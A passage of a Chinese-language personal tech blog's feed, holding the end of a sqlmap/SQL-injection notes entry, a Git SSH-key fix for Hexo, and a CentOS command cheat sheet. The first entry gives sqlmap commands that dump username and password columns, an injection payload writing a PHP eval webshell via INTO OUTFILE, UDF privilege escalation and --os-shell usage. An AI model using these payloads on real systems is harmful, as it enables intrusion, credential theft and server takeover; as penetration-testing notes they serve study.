“sqlmap.log” #保存进度</li><li><p>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql” –dbs  -o “sqlmap.log” –resume  #恢复已保存进度</p></li><li><p>./sqlmap.py -u “<a href="http://www.91ri.org/" target="_blank" rel="noopener">http://www.91ri.org/</a> id1/1*/id2/2″<br>“Show.asp” –cookie “id=9” –table –level 2<br>–forms<br>–data “data”<br>–delay 0.5<br>–safe-freq  25<br>-v 3 –dbs  –batch –tamper “base64encode.py”<br>sqlmap.py -u url -D “data”  -T “tables” -C “username,password,email” –dump-all -v</p></li></ul><h2 id="传统的sql语句写shell"><a href="#传统的sql语句写shell" class="headerlink" title="传统的sql语句写shell"></a>传统的sql语句写shell</h2><p>通过sql注入select into outfile实现，如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; union select 1,&apos;&lt;?php eval($_POST[a]);?&gt;&apos; INTO OUTFILE &apos;/var/www/tmp/nb.php&apos;#</span><br></pre></td></tr></table></figure><p>dumpfile、file_put_contents</p><p>outfile不能用了怎么办？<code>select unhex(&#39;udf.dll hex code&#39;) into dumpfile &#39;c:/mysql/mysqlserver 5.1/lib/plugin/xxoo.dll&#39;</code>;可以 UDF提权<a href="https://www.cnblogs.com/milantgh/p/5444398.html" target="_blank" rel="noopener">https://www.cnblogs.com/milantgh/p/5444398.html</a></p><p>outfile适合导库，在行末会写入新行并转义，因此不能写入二进制可执行文件。</p><p>写shell条件</p><ul><li>文件名必须是绝对路径</li><li>用户必须有写文件权限</li></ul><h2 id="sqlmap写shell"><a href="#sqlmap写shell" class="headerlink" title="sqlmap写shell"></a>sqlmap写shell</h2><p>前提需要对目录具有写权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--os-cmd=&quot;net user&quot;</span><br></pre></td></tr></table></figure><p>交互式命令执行，注意在使用交互式方式时需知道网站的绝对路径，执行成功后在绝对路径下创建文件返回结果，然后再自动删除。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--os-shell</span><br></pre></td></tr></table></figure><p>写webshell，会生成两个文件，tmpbshrd.php和tmpucnll.php，分别为命令执行和文件上传webshell</p><p>关闭sqlmap文件就会被删除</p><h2 id="常见数据库端口号"><a href="#常见数据库端口号" class="headerlink" title="常见数据库端口号"></a>常见数据库端口号</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Oracle 默认1521</span><br><span class="line"></span><br><span class="line">SQL Server 默认1433</span><br><span class="line"></span><br><span class="line">Mysql默认3306</span><br><span class="line"></span><br><span class="line">21 FTP</span><br><span class="line"></span><br><span class="line">22 ssh</span><br><span class="line"></span><br><span class="line">23 telnet</span><br><span class="line"></span><br><span class="line">25 smtp</span><br><span class="line"></span><br><span class="line">109 110 pop2 pop3</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;sqlmap&quot;&gt;&lt;a href=&quot;#sqlmap&quot; class=&quot;headerlink&quot; title=&quot;sqlmap&quot;&gt;&lt;/a&gt;sqlmap&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;-u #注入点&lt;/li&gt;
&lt;li&gt;-f #指纹判别数据库类型&lt;/li&gt;
&lt;li&gt;-b #获取数据
      
    
    </summary>
    
      <category term="Note" scheme="https://winthorlimo.github.io/categories/Note/"/>
    
    
      <category term="Tools" scheme="https://winthorlimo.github.io/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>Hexo日志</title>
    <link href="https://winthorlimo.github.io/note/2019/undefined02/1c91193.html"/>
    <id>https://winthorlimo.github.io/note/2019/undefined02/1c91193.html</id>
    <published>2019-06-02T04:18:55.000Z</published>
    <updated>2020-08-20T09:26:35.719Z</updated>
    
    <content type="html"><![CDATA[<h4 id="2019-6-1"><a href="#2019-6-1" class="headerlink" title="2019.6.1"></a>2019.6.1</h4><p>Git 远程遇到了问题:</p><blockquote><p>Please make sure you have the correct access rights and the repository exists.</p></blockquote><p>发现是ssh key有问题，连接不上服务器</p><ol><li><p>首先是重新在git设置一下身份的名字和邮箱：</p><ul><li><code>git config --global user.name &quot;yourname&quot;</code></li><li><p><code>git config --global user.email &quot;your@email.com&quot;</code></p><p>注：要添加具体的yourname，your@email</p></li></ul></li><li>删除.ssh文件夹（直接搜索该文件夹）下的known_hosts</li><li><p>在 git输入命令：</p><p> <code>$ ssh-keygen -t rsa -C &quot;your@email.com&quot;</code></p><p> 然后会出现：</p><blockquote><p>Generating public/private rsa key pair. Enter file in which to save the key (/Users/your_user_directory/.ssh/id_rsa):</p></blockquote><p> 回车后系统自动在 .ssh 文件夹下生成两个文件，id_rsa和id_rsa.pub，用记事本打开id_rsa.pub，把全部内容复制</p></li><li>登陆GitHub 账户，进入设置中的“SSH and GPG keys”新建 SSH      keys 在 Key中把刚刚复制的粘贴进去，点击 add ssh key</li><li><p>在 git 中输入命令</p><p> <code>ssh -T git@github.com</code></p><p> 然后输入Yes回车，就会提示成功</p></li></ol><p>之后就可以正常 hexo d -g 啦</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;2019-6-1&quot;&gt;&lt;a href=&quot;#2019-6-1&quot; class=&quot;headerlink&quot; title=&quot;2019.6.1&quot;&gt;&lt;/a&gt;2019.6.1&lt;/h4&gt;&lt;p&gt;Git 远程遇到了问题:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Please make s
      
    
    </summary>
    
      <category term="Note" scheme="https://winthorlimo.github.io/categories/Note/"/>
    
    
      <category term="hexo" scheme="https://winthorlimo.github.io/tags/hexo/"/>
    
  </entry>
  
  <entry>
    <title>CentOS</title>
    <link href="https://winthorlimo.github.io/note/2019/undefined25/875db5e1.html"/>
    <id>https://winthorlimo.github.io/note/2019/undefined25/875db5e1.html</id>
    <published>2019-05-25T10:09:05.000Z</published>
    <updated>2020-08-20T09:26:39.199Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://qiniuyun.lintstar.top/CentOS-笔记.png" alt="CentOS-笔记"></p><h4 id="CentOS-常用命令"><a href="#CentOS-常用命令" class="headerlink" title="CentOS 常用命令"></a>CentOS 常用命令</h4><ul><li><code>shutdown -h now</code>             关机</li><li><code>shutdown -h +3</code>              三分钟后关机</li><li><code>halt</code></li><li><code>poweroff</code></li><li><p><code>init 0</code></p></li><li><p><code>shutdown -r now</code>             重启</p></li><li><code>shutdown -r +3</code>              三分钟重启</li><li><code>reboot</code></li><li><p><code>init 6</code></p></li><li><p><code>cat 1.txt | tail - n +3001 | head -n 1000</code>                       截取文件中的3001到4000</p></li><li><p><code>grep o 1.txt</code>                正常过滤</p></li><li><p><code>grep -v 1.txt</code>               反向过滤</p></li><li><p><code>cat &gt;1.txt</code>                  清空文件内容</p></li><li><p><code>ll -d /data/www</code>             查看权限</p></li><li><p><code>pkill -kill -t tty3</code>          杀死用户进程</p></li><li><p><code>mkdir /media/cdrom</code></p></li><li><code>mount /dev/sr0  /media/cdrom</code>             挂载光盘</li><li><p><code>umount /media/cdrom</code>                      卸载</p></li><li><p><code>systemctl stop firewalld.service</code>         关闭防火墙</p></li><li><code>setenforce 0</code>                             给外界权限</li><li><code>systemctl disable firewalld.service</code>      永久关闭</li><li><code>systemctl enable firewalld.service</code>       永久开启</li><li><code>vim /etc/rc.d/rc.local</code>                   设置开机启动<br>为镜像添加开机自动挂载</li><li><p><code>echo &quot;mount /dev/sr0  /media/cdrom&quot; &gt;&gt; /etc/rc.d/rc.local</code></p></li><li><p><code>vim /etc/selinux/config</code></p></li><li><p><code>^vim^cat</code>                        把vim替换成cat继续执行</p></li><li><p><code>ls -al</code>                          看临时文件</p></li></ul><h4 id="CentOS7-目录文件"><a href="#CentOS7-目录文件" class="headerlink" title="CentOS7 目录文件"></a>CentOS7 目录文件</h4><ul><li><code>/etc/yum.repos.d/</code>                   yum源文件位置</li><li><code>/etc/rc.d/rc.local</code>                  开机启动文件</li><li><code>rm -f /var/run/yum.pid</code></li><li><code>yum clean all</code>                       清空yum源缓存</li><li><code>/etc/nginx/conf.d/default.conf</code>      Nginx配置文件</li><li><code>vim /etc/my.cnf</code>                     去mysql密码要求</li><li><code>/usr/share/nginx/html/</code>              Nginx主页文件位置</li><li><code>/etc/httpd/conf/httpd.conf</code>          Apache配置文件</li><li><code>/var/www/html/</code>                      Apache主页文件位置</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;http://qiniuyun.lintstar.top/CentOS-笔记.png&quot; alt=&quot;CentOS-笔记&quot;&gt;&lt;/p&gt;
&lt;h4 id=&quot;CentOS-常用命令&quot;&gt;&lt;a href=&quot;#CentOS-常用命令&quot; class=&quot;headerlink&quot;
      
    
    </summary>
    
      <category term="Note" scheme="https://winthorlimo.github.io/categories/Note/"/>
    
    
      <category term="Linux" scheme="https://winthorlimo.github.io/tags/Linux/"/>
    
  </entry>
  
</feed>
